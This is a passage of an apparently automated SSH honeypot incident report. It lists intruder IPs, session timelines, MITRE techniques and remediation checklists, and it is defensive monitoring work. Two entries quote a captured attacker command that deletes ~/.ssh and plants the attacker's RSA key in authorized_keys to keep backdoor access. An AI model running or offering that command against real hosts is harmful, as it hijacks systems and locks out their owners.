| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:24:13` | `cowrie.session.connect` |
| `2026-08-20 05:24:14` | `cowrie.client.version` |
| `2026-08-20 05:24:14` | `cowrie.client.kex` |
| `2026-08-20 05:24:17` | `cowrie.login.success` |
| `2026-08-20 05:24:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50fae90e5f0f

| Field | Detail |
|---|---|
| **Source IP** | `117.223.152[.]94` |
| **First Seen** | 2026-08-20 05:24 |
| **Last Seen** | 2026-08-20 05:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:24:24` | `cowrie.session.connect` |
| `2026-08-20 05:24:24` | `cowrie.client.version` |
| `2026-08-20 05:24:24` | `cowrie.client.kex` |
| `2026-08-20 05:24:26` | `cowrie.login.success` |
| `2026-08-20 05:24:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.223.152[.]94` to AbuseIPDB if not already reported
- [ ] Block `117.223.152[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13203d0fa26

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-08-20 05:24 |
| **Last Seen** | 2026-08-20 05:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:24:34` | `cowrie.session.connect` |
| `2026-08-20 05:24:34` | `cowrie.client.version` |
| `2026-08-20 05:24:34` | `cowrie.client.kex` |
| `2026-08-20 05:24:35` | `cowrie.login.success` |
| `2026-08-20 05:24:36` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c70102d0d5

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-08-20 05:25 |
| **Last Seen** | 2026-08-20 05:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:25:27` | `cowrie.session.connect` |
| `2026-08-20 05:25:28` | `cowrie.client.version` |
| `2026-08-20 05:25:28` | `cowrie.client.kex` |
| `2026-08-20 05:25:30` | `cowrie.login.success` |
| `2026-08-20 05:25:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe80d42a38b1

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-08-20 05:25 |
| **Last Seen** | 2026-08-20 05:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:25:35` | `cowrie.session.connect` |
| `2026-08-20 05:25:36` | `cowrie.client.version` |
| `2026-08-20 05:25:36` | `cowrie.client.kex` |
| `2026-08-20 05:25:37` | `cowrie.login.success` |
| `2026-08-20 05:25:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa976f1490fa

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:26 |
| **Last Seen** | 2026-08-20 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:26:08` | `cowrie.session.connect` |
| `2026-08-20 05:26:08` | `cowrie.client.version` |
| `2026-08-20 05:26:08` | `cowrie.client.kex` |
| `2026-08-20 05:26:08` | `cowrie.login.success` |
| `2026-08-20 05:26:09` | `cowrie.session.params` |
| `2026-08-20 05:26:09` | `cowrie.command.input` |
| `2026-08-20 05:26:09` | `cowrie.log.closed` |
| `2026-08-20 05:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d5966b5493

| Field | Detail |
|---|---|
| **Source IP** | `216.173.112[.]34` |
| **First Seen** | 2026-08-20 05:29 |
| **Last Seen** | 2026-08-20 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:29:22` | `cowrie.session.connect` |
| `2026-08-20 05:29:22` | `cowrie.client.version` |
| `2026-08-20 05:29:22` | `cowrie.client.kex` |
| `2026-08-20 05:29:22` | `cowrie.login.success` |
| `2026-08-20 05:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.173.112[.]34` to AbuseIPDB if not already reported
- [ ] Block `216.173.112[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-520c62a99b07

| Field | Detail |
|---|---|
| **Source IP** | `216.173.112[.]34` |
| **First Seen** | 2026-08-20 05:29 |
| **Last Seen** | 2026-08-20 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:29:22` | `cowrie.session.connect` |
| `2026-08-20 05:29:22` | `cowrie.client.version` |
| `2026-08-20 05:29:22` | `cowrie.client.kex` |
| `2026-08-20 05:29:22` | `cowrie.login.success` |
| `2026-08-20 05:29:23` | `cowrie.session.params` |
| `2026-08-20 05:29:23` | `cowrie.command.input` |
| `2026-08-20 05:29:23` | `cowrie.log.closed` |
| `2026-08-20 05:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.173.112[.]34` to AbuseIPDB if not already reported
- [ ] Block `216.173.112[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8089e16b671

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-20 05:31 |
| **Last Seen** | 2026-08-20 05:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:31:25` | `cowrie.session.connect` |
| `2026-08-20 05:31:26` | `cowrie.client.version` |
| `2026-08-20 05:31:26` | `cowrie.client.kex` |
| `2026-08-20 05:31:32` | `cowrie.login.success` |
| `2026-08-20 05:31:36` | `cowrie.session.params` |
| `2026-08-20 05:31:36` | `cowrie.command.input` |
| `2026-08-20 05:31:38` | `cowrie.log.closed` |
| `2026-08-20 05:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e428fc092f23

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:32 |
| **Last Seen** | 2026-08-20 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:32:05` | `cowrie.session.connect` |
| `2026-08-20 05:32:05` | `cowrie.client.version` |
| `2026-08-20 05:32:05` | `cowrie.client.kex` |
| `2026-08-20 05:32:05` | `cowrie.login.success` |
| `2026-08-20 05:32:06` | `cowrie.session.params` |
| `2026-08-20 05:32:06` | `cowrie.command.input` |
| `2026-08-20 05:32:06` | `cowrie.log.closed` |
| `2026-08-20 05:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad00ad31e0f5

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:38 |
| **Last Seen** | 2026-08-20 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:38:01` | `cowrie.session.connect` |
| `2026-08-20 05:38:01` | `cowrie.client.version` |
| `2026-08-20 05:38:01` | `cowrie.client.kex` |
| `2026-08-20 05:38:01` | `cowrie.login.success` |
| `2026-08-20 05:38:02` | `cowrie.session.params` |
| `2026-08-20 05:38:02` | `cowrie.command.input` |
| `2026-08-20 05:38:02` | `cowrie.log.closed` |
| `2026-08-20 05:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84cc5bc402d1

| Field | Detail |
|---|---|
| **Source IP** | `50.116.26[.]161` |
| **First Seen** | 2026-08-20 05:40 |
| **Last Seen** | 2026-08-20 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:40:02` | `cowrie.session.connect` |
| `2026-08-20 05:40:02` | `cowrie.login.success` |
| `2026-08-20 05:40:03` | `cowrie.session.params` |
| `2026-08-20 05:40:03` | `cowrie.command.input` |
| `2026-08-20 05:40:03` | `cowrie.command.failed` |
| `2026-08-20 05:40:03` | `cowrie.command.input` |
| `2026-08-20 05:40:03` | `cowrie.command.failed` |
| `2026-08-20 05:40:03` | `cowrie.command.input` |
| `2026-08-20 05:40:03` | `cowrie.command.failed` |
| `2026-08-20 05:40:03` | `cowrie.command.input` |
| `2026-08-20 05:40:03` | `cowrie.log.closed` |
| `2026-08-20 05:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.26[.]161` to AbuseIPDB if not already reported
- [ ] Block `50.116.26[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47e2073d05f

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-08-20 05:41 |
| **Last Seen** | 2026-08-20 05:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:41:31` | `cowrie.session.connect` |
| `2026-08-20 05:41:33` | `cowrie.client.version` |
| `2026-08-20 05:41:33` | `cowrie.client.kex` |
| `2026-08-20 05:41:36` | `cowrie.login.success` |
| `2026-08-20 05:41:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a29eef57e19

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:43 |
| **Last Seen** | 2026-08-20 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:43:57` | `cowrie.session.connect` |
| `2026-08-20 05:43:57` | `cowrie.client.version` |
| `2026-08-20 05:43:57` | `cowrie.client.kex` |
| `2026-08-20 05:43:57` | `cowrie.login.success` |
| `2026-08-20 05:43:58` | `cowrie.session.params` |
| `2026-08-20 05:43:58` | `cowrie.command.input` |
| `2026-08-20 05:43:58` | `cowrie.log.closed` |
| `2026-08-20 05:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a78a4b73f1a

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-20 05:44 |
| **Last Seen** | 2026-08-20 05:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:44:13` | `cowrie.session.connect` |
| `2026-08-20 05:44:14` | `cowrie.client.version` |
| `2026-08-20 05:44:14` | `cowrie.client.kex` |
| `2026-08-20 05:44:20` | `cowrie.login.success` |
| `2026-08-20 05:44:23` | `cowrie.session.params` |
| `2026-08-20 05:44:23` | `cowrie.command.input` |
| `2026-08-20 05:44:26` | `cowrie.log.closed` |
| `2026-08-20 05:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c028fd67efa

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-08-20 05:45 |
| **Last Seen** | 2026-08-20 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:45:37` | `cowrie.session.connect` |
| `2026-08-20 05:45:37` | `cowrie.client.version` |
| `2026-08-20 05:45:37` | `cowrie.client.kex` |
| `2026-08-20 05:45:38` | `cowrie.login.success` |
| `2026-08-20 05:45:39` | `cowrie.session.params` |
| `2026-08-20 05:45:39` | `cowrie.command.input` |
| `2026-08-20 05:45:39` | `cowrie.command.failed` |
| `2026-08-20 05:45:40` | `cowrie.log.closed` |
| `2026-08-20 05:45:41` | `cowrie.session.params` |
| `2026-08-20 05:45:41` | `cowrie.command.input` |
| `2026-08-20 05:45:41` | `cowrie.session.file_download` |
| `2026-08-20 05:45:41` | `cowrie.log.closed` |
| `2026-08-20 05:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc4179405641

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-08-20 05:45 |
| **Last Seen** | 2026-08-20 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:45:41` | `cowrie.session.connect` |
| `2026-08-20 05:45:41` | `cowrie.client.version` |
| `2026-08-20 05:45:41` | `cowrie.client.kex` |
| `2026-08-20 05:45:42` | `cowrie.login.success` |
| `2026-08-20 05:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2441a92877

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-08-20 05:45 |
| **Last Seen** | 2026-08-20 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:45:42` | `cowrie.session.connect` |
| `2026-08-20 05:45:42` | `cowrie.client.version` |
| `2026-08-20 05:45:43` | `cowrie.client.kex` |
| `2026-08-20 05:45:43` | `cowrie.login.success` |
| `2026-08-20 05:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130fed4ddf05

| Field | Detail |
|---|---|
| **Source IP** | `60.172.1[.]210` |
| **First Seen** | 2026-08-20 05:49 |
| **Last Seen** | 2026-08-20 05:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:49:00` | `cowrie.session.connect` |
| `2026-08-20 05:49:01` | `cowrie.client.version` |
| `2026-08-20 05:49:01` | `cowrie.client.kex` |
| `2026-08-20 05:49:05` | `cowrie.login.success` |
| `2026-08-20 05:49:05` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.1[.]210` to AbuseIPDB if not already reported
- [ ] Block `60.172.1[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7490427668e

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-08-20 05:49 |
| **Last Seen** | 2026-08-20 05:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:49:12` | `cowrie.session.connect` |
| `2026-08-20 05:49:12` | `cowrie.client.version` |
| `2026-08-20 05:49:12` | `cowrie.client.kex` |
| `2026-08-20 05:49:14` | `cowrie.login.success` |
| `2026-08-20 05:49:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 05:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442f884642af

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-20 05:49 |
| **Last Seen** | 2026-08-20 05:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:49:54` | `cowrie.session.connect` |
| `2026-08-20 05:49:54` | `cowrie.client.version` |
| `2026-08-20 05:49:54` | `cowrie.client.kex` |
| `2026-08-20 05:49:54` | `cowrie.login.success` |
| `2026-08-20 05:49:55` | `cowrie.session.params` |
| `2026-08-20 05:49:55` | `cowrie.command.input` |
| `2026-08-20 05:49:55` | `cowrie.log.closed` |
| `2026-08-20 05:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d867c599e4ec

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]224` |
| **First Seen** | 2026-08-20 05:50 |
| **Last Seen** | 2026-08-20 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:50:59` | `cowrie.session.connect` |
| `2026-08-20 05:50:59` | `cowrie.login.success` |
| `2026-08-20 05:51:00` | `cowrie.session.params` |
| `2026-08-20 05:51:00` | `cowrie.command.input` |
| `2026-08-20 05:51:00` | `cowrie.command.input` |
| `2026-08-20 05:51:00` | `cowrie.command.failed` |
| `2026-08-20 05:51:00` | `cowrie.command.input` |
| `2026-08-20 05:51:00` | `cowrie.command.failed` |
| `2026-08-20 05:51:00` | `cowrie.command.input` |
| `2026-08-20 05:51:00` | `cowrie.log.closed` |
| `2026-08-20 05:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79c2c46cf56

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-20 05:51 |
| **Last Seen** | 2026-08-20 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:51:36` | `cowrie.session.connect` |
| `2026-08-20 05:51:36` | `cowrie.client.version` |
| `2026-08-20 05:51:36` | `cowrie.client.kex` |
| `2026-08-20 05:51:36` | `cowrie.login.success` |
| `2026-08-20 05:51:37` | `cowrie.session.params` |
| `2026-08-20 05:51:37` | `cowrie.command.input` |
| `2026-08-20 05:51:37` | `cowrie.command.failed` |
| `2026-08-20 05:51:37` | `cowrie.log.closed` |
| `2026-08-20 05:51:38` | `cowrie.session.params` |
| `2026-08-20 05:51:38` | `cowrie.command.input` |
| `2026-08-20 05:51:38` | `cowrie.session.file_download` |
| `2026-08-20 05:51:38` | `cowrie.log.closed` |
| `2026-08-20 05:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef24c79f695

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-20 05:51 |
| **Last Seen** | 2026-08-20 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 05:51:38` | `cowrie.session.connect` |
| `2026-08-20 05:51:38` | `cowrie.client.version` |
| `2026-08-20 05:51:39` | `cowrie.client.kex` |
| `2026-08-20 05:51:39` | `cowrie.login.success` |
| `2026-08-20 05:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
